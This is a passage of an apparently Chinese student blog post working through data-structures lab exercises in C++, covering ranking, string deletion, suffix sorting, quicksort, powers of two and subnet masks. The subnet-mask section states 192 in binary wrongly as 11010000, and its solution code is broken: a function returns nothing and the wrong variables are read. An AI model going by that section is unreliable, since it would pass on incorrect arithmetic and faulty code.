class="title">cmpgp</span><span class="params">(Country x, Country y)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x.g / x.p &gt; y.g / y.p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmpjp</span><span class="params">(Country x, Country y)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x.j / x.p &gt; y.j / y.p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, m;</span><br><span class="line">	<span class="keyword">int</span> need[s];</span><br><span class="line">	<span class="keyword">int</span> rank[s][<span class="number">5</span>];</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; c[i].g &gt;&gt; c[i].j &gt;&gt; c[i].p;</span><br><span class="line">			c[i].id = i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; need[i];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		sort(c, c + n, cmpg);</span><br><span class="line">		rank[c[<span class="number">0</span>].id][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c[i].g == c[i - <span class="number">1</span>].g)</span><br><span class="line">				rank[c[i].id][<span class="number">1</span>] = rank[c[i - <span class="number">1</span>].id][<span class="number">1</span>];</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				rank[c[i].id][<span class="number">1</span>] = i + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		sort(c, c + n, cmpj);</span><br><span class="line">		rank[c[<span class="number">0</span>].id][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c[i].j == c[i - <span class="number">1</span>].j)</span><br><span class="line">				rank[c[i].id][<span class="number">2</span>] = rank[c[i - <span class="number">1</span>].id][<span class="number">2</span>];</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				rank[c[i].id][<span class="number">2</span>] = i + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		sort(c, c + n, cmpgp);</span><br><span class="line">		rank[c[<span class="number">0</span>].id][<span class="number">3</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c[i].g / c[i].p == c[i - <span class="number">1</span>].g / c[i - <span class="number">1</span>].p)</span><br><span class="line">				rank[c[i].id][<span class="number">3</span>] = rank[c[i - <span class="number">1</span>].id][<span class="number">3</span>];</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				rank[c[i].id][<span class="number">3</span>] = i + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		sort(c, c + n, cmpjp);</span><br><span class="line">		rank[c[<span class="number">0</span>].id][<span class="number">4</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c[i].j / c[i].p == c[i - <span class="number">1</span>].j / c[i - <span class="number">1</span>].p)</span><br><span class="line">				rank[c[i].id][<span class="number">4</span>] = rank[c[i - <span class="number">1</span>].id][<span class="number">4</span>];</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				rank[c[i].id][<span class="number">4</span>] = i + <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">			<span class="keyword">int</span> min = n + <span class="number">1</span>, type = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> t = <span class="number">1</span>; t &lt;= <span class="number">4</span>; t++) &#123;</span><br><span class="line">				<span class="keyword">int</span> tmp = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">					<span class="keyword">if</span> (i != j) &#123;</span><br><span class="line">						<span class="keyword">if</span> (rank[need[i]][t] &gt; rank[need[j]][t]) &#123;</span><br><span class="line">							tmp++;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (min &gt; tmp) &#123;</span><br><span class="line">					min = tmp;</span><br><span class="line">					type = t;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; min &lt;&lt; <span class="string">":"</span> &lt;&lt; type &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h5><p>本题需要解决的是奥运会中各国家最有利的排名方式以及名次。只要进行五次排序即可。首先读入各国家信息，写好国家编号，计算和存储排名所需要的数据。然后按四种排名方式分别对需要排名的国家进行排名，并记录名次。最后使用国家编号对国家进行排名。这样就可以输出结果了。</p>
<p><br></p>
<h3 id="问题-H-字符串的查找删除"><a href="#问题-H-字符串的查找删除" class="headerlink" title="问题 H: 字符串的查找删除"></a>问题 H: 字符串的查找删除</h3><h5 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定一个短字符串（不含空格），再给定若干字符串，在这些字符串中删除所含有的短字符串。</p>
<h5 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h5><p>输入只有1组数据。<br>输入一个短字符串（不含空格），再输入若干字符串直到文件结束为止。</p>
<h5 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h5><p>删除输入的短字符串(不区分大小写)并去掉空格,输出。</p>
<h5 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">in</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" Hi "</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#clude</span></span><br><span class="line"><span class="selector-tag">tma</span>()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">prtf</span>(<span class="string">"Hi"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h5><p>注:将字符串中的In、IN、iN、in删除。</p>
<h5 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h5><p>使用了几个函数：</p>
<ul>
<li><code>tolower()</code>：将字符转换为小写</li>
<li><code>string.find(str,index)</code>：在string里面查找str子串，index指定开始查找的位置，若找到,返回该字串的位置；若未找到，返回<code>string::npos</code></li>
<li><code>string.erase(index,length)</code>：从index开始删除string中长度为length的子串</li>
</ul>
<p>知道了上面函数的使用方法后，思路上也就没什么难的了，注意比较前要先都转换为小写（题中不区分大小写）。</p>
<h5 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> del, rep, lrep;</span><br><span class="line">    <span class="keyword">int</span> index, k;</span><br><span class="line">    getline(<span class="built_in">cin</span>, del);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; del.length(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        del[i] = <span class="built_in">tolower</span>(del[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (getline(<span class="built_in">cin</span>, rep))</span><br><span class="line">    &#123;</span><br><span class="line">        lrep = <span class="string">""</span>;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rep.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            lrep += <span class="built_in">tolower</span>(rep[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (lrep.find(del, index) != <span class="built_in">string</span>::npos)</span><br><span class="line">        &#123;</span><br><span class="line">            k = lrep.find(del, index);</span><br><span class="line">            lrep.erase(k, del.length());</span><br><span class="line">            rep.erase(k, del.length());</span><br><span class="line">            index = k;</span><br><span class="line">        &#125;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (lrep.find(<span class="string">" "</span>, index) != <span class="built_in">string</span>::npos)</span><br><span class="line">        &#123;</span><br><span class="line">            k = lrep.find(<span class="string">" "</span>, index);</span><br><span class="line">            lrep.erase(k, <span class="number">1</span>);</span><br><span class="line">            rep.erase(k, <span class="number">1</span>);</span><br><span class="line">            index = k;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rep &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-I-后缀子串排序"><a href="#问题-I-后缀子串排序" class="headerlink" title="问题 I: 后缀子串排序"></a>问题 I: 后缀子串排序</h3><h5 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h5><p>对于一个字符串，将其后缀子串进行排序，例如grain<br>其子串有：<br>grain<br>rain<br>ain<br>in<br>n<br>然后对各子串按字典顺序排序，即：<br>ain,grain,in,n,rain</p>
<h5 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h5><p>每个案例为一行字符串。</p>
<h5 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h5><p>将子串排序输出</p>
<h5 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">grain</span></span><br><span class="line"><span class="attribute">banana</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">ain</span><br><span class="line">grain</span><br><span class="line"><span class="keyword">in</span></span><br><span class="line">n</span><br><span class="line">rain</span><br><span class="line">a</span><br><span class="line">ana</span><br><span class="line">anana</span><br><span class="line">banana</span><br><span class="line">na</span><br><span class="line">nana</span><br></pre></td></tr></table></figure>
<h5 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h5><p>双重循环，外层循环遍历字符串中每一个字符作为当前子串的首字符，内层循环从该首字符一直取到字符串结束，将所有的子串存到数组里，最后用<code>sort()</code>排序后输出即得到字典序。</p>
<h5 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="built_in">string</span> a, <span class="built_in">string</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a &lt; b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> str;</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; str)</span><br><span class="line">	&#123;</span><br><span class="line">		len = str.length();</span><br><span class="line">		<span class="built_in">string</span> *s = <span class="keyword">new</span> <span class="built_in">string</span>[len];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="built_in">string</span> temp = <span class="string">""</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; len; j++)</span><br><span class="line">				temp += str[j];</span><br><span class="line">			s[i] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">		sort(s, s+len, cmp);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; s[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-J-算法10-6-10-8：快速排序"><a href="#问题-J-算法10-6-10-8：快速排序" class="headerlink" title="问题 J: 算法10-6~10-8：快速排序"></a>问题 J: 算法10-6~10-8：快速排序</h3><h5 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h5><p>快速排序是对起泡排序的一种改进。它的基本思想是，通过一趟排序将待排序的记录分割成两个独立的部分，其中一部分记录的关键字均比另一部分的关键字小，在分成两个部分之后则可以分别对这两个部分继续进行排序，从而使整个序列有序。<br>快速排序的算法可以描述如下：<br><img src="/2019/10/20/数据结构实验复习/20191018134654190.png" alt="在这里插入图片描述"></p>
<p>在本题中，读入一串整数，将其使用以上描述的快速排序的方法从小到大排序，并输出。</p>
<h5 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h5><p>输入的第一行包含1个正整数n，表示共有n个整数需要参与排序。其中n不超过100000。<br>第二行包含n个用空格隔开的正整数，表示n个需要排序的整数。</p>
<h5 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h5><p>只有1行，包含n个整数，表示从小到大排序完毕的所有整数。<br>请在每个整数后输出一个空格，并请注意行尾输出换行。</p>
<h5 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">2</span> <span class="number">8</span> <span class="number">4</span> <span class="number">6</span> <span class="number">1</span> <span class="number">10</span> <span class="number">7</span> <span class="number">3</span> <span class="number">5</span> <span class="number">9</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
<h5 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h5><p>在本题中，需要按照题目描述中的算法完成快速排序的算法。</p>
<p>快速排序是一种十分常用的排序算法，其平均时间复杂度为O(knlnn)，其中n为待排序序列中记录的个数，k为常数。大量的实际应用证明，在所有同数量级的此类排序算法中，快速排序的常数因子k是最小的，因此，就平均时间而言，快速排序是目前被认为最好的一种内部排序方法。</p>
<p>而在C语言的常用编译器中，qsort函数是一个非常常用的快速排序函数。</p>
<h5 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h5><p>考试应该不会出这么耿直的题，直接sort()就好了…</p>
<h5 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> loc = low;</span><br><span class="line">	<span class="keyword">int</span> key = a[low];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = low + <span class="number">1</span>; i &lt;= high; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i] &lt; key)</span><br><span class="line">		&#123;</span><br><span class="line">			loc++;</span><br><span class="line">			<span class="keyword">if</span> (loc != i)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">int</span> temp = a[i];</span><br><span class="line">				a[i] = a[loc];</span><br><span class="line">				a[loc] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a[low] = a[loc];</span><br><span class="line">	a[loc] = key;</span><br><span class="line">	<span class="keyword">return</span> loc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Qsort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (low &lt; high)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> loc = Partition(a, low, high);</span><br><span class="line">		Qsort(a, low, loc - <span class="number">1</span>);</span><br><span class="line">		Qsort(a, loc + <span class="number">1</span>, high);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">	Qsort(a, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-K-为什么1024是程序员节"><a href="#问题-K-为什么1024是程序员节" class="headerlink" title="问题 K: 为什么1024是程序员节"></a>问题 K: 为什么1024是程序员节</h3><h5 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h5><p>小雏鸟正在看剧。突然被插播的广告吓了一跳。</p>
<p>只见广告上说 1024你懂的</p>
<p>小雏鸟不懂， 问身边的大白。大白说，这个1024是2的10次方，程序员把10月24日作为程序猿日。</p>
<p>现在给你一个整数N，让你求2的N次方有多大。</p>
<h5 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h5><p>一个整数N，N&lt;30</p>
<h5 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h5><p>一个整数，2的N次方的结果</p>
<h5 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-10"><a href="#样例输出-10" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1024</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h5><p>水题</p>
<h5 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, res = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">	<span class="comment">//res = pow(2,n);</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		res *= <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<p><br></p>
<h1 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h1><h4 id="问题-A-子网掩码"><a href="#问题-A-子网掩码" class="headerlink" title="问题 A: 子网掩码"></a>问题 A: 子网掩码</h4><h5 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h5><p>子网掩码是用来判断任意两台计算机的IP地址是否属于同一子网络的根据。<br>最为简单的理解就是两台计算机各自的IP地址与子网掩码进行AND运算后，如果得出的结果是相同的，则说明这两台计算机是处于同一个子网络上的，可以进行直接的通讯。就这么简单。</p>
<p>请看以下示例：</p>
<p>运算演示之一：<br>IP地址　   192.168.0.1<br>子网掩码　 255.255.255.0 </p>
<p>转化为二进制进行运算：<br>IP地址　  11010000.10101000.00000000.00000001<br>子网掩码　11111111.11111111.11111111.00000000 </p>
<p>AND运算：<br>　　　　　11010000.10101000.00000000.00000000 </p>
<p>转化为十进制后为：<br>　　　　　　192.168.0.0</p>
<p>运算演示之二：<br>IP地址　   192.168.0.254<br>子网掩码　 255.255.255.0 </p>
<p>转化为二进制进行运算：<br>IP地址　  11010000.10101000.00000000.11111110<br>子网掩码　11111111.11111111.11111111.00000000 </p>
<p>AND运算：<br>　　　　　11010000.10101000.00000000.00000000 </p>
<p>转化为十进制后为：<br>　　　　　　192.168.0.0</p>
<p>运算演示之三：<br>IP地址　   192.168.0.4<br>子网掩码　 255.255.255.0</p>
<p>转化为二进制进行运算：<br>IP地址　  11010000.10101000.00000000.00000100<br>子网掩码　11111111.11111111.11111111.00000000 </p>
<p>AND运算：<br>　　　　　11010000.10101000.00000000.00000000 </p>
<p>转化为十进制后为：<br>　　　　　　192.168.0.0</p>
<p>通过以上对三组计算机IP地址与子网掩码的AND运算后，我们可以看到它运算结果是一样的，均为192.168.0.0，所以计算机就会把这三台计算机视为在同一子网络。</p>
<h5 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h5><p>···<br>输入的第一行是本机IP地址；<br>第二行是子网掩码；<br>第三行是一个整数N，表示后面有N个IP地址；<br>接下来N行：<br>第1个IP地址<br>…<br>…<br>第N个IP地址</p>
<h5 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h5><p>计算并输出N个IP地址是否与本机在同一子网内。对于在同一子网的输出“INNER”，对于在不同子网的输出“OUTER”。</p>
<h5 id="样例输入-10"><a href="#样例输入-10" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.254</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-11"><a href="#样例输出-11" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">INNER</span></span><br><span class="line"><span class="attribute">INNER</span></span><br><span class="line"><span class="attribute">OUTER</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h5><p>我的思路是用string类存储ip地址和子网掩码，然后分为四段将string类转换为int型后再进行与运算，最后的结果进行判断。</p>
<ul>
<li><code>dot2space(string a)</code>将输入中的<code>.</code>替换为空格，方便后续进行分割。</li>
<li><code>clca(string ip,string sub)</code>根据ip地址和子网掩码计算想与后的地址</li>
<li>这里分割成四段以及将string转换为int，均可以用<code>sstrean</code>头文件中的<code>stringstream</code>流来操作。<code>&gt;&gt;</code>会以空格作为分割从<code>stringstream</code>流中提取字符串，在赋给int型数组元素的时候完成转换。</li>
</ul>
<p>肯定还有其他的思路，我的代码太丑..</p>
<h5 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">dot2space</span><span class="params">(<span class="built_in">string</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] == <span class="string">'.'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = <span class="string">' '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">clca</span><span class="params">(<span class="built_in">string</span> ip, <span class="built_in">string</span> sub)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ip2[<span class="number">4</span>], sub2[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">string</span> addr = <span class="string">""</span>;</span><br><span class="line">    ip = dot2space(ip);</span><br><span class="line">    sub = dot2space(sub);</span><br><span class="line">    <span class="function"><span class="built_in">stringstream</span> <span class="title">s1</span><span class="params">(ip)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">stringstream</span> <span class="title">s2</span><span class="params">(ip)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s1 &gt;&gt; ip[i];</span><br><span class="line">        s2 &gt;&gt; sub[i];</span><br><span class="line">        addr += to_string(ip2[i] &amp; sub2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> localIP, sub, addr;</span><br><span class="line">    <span 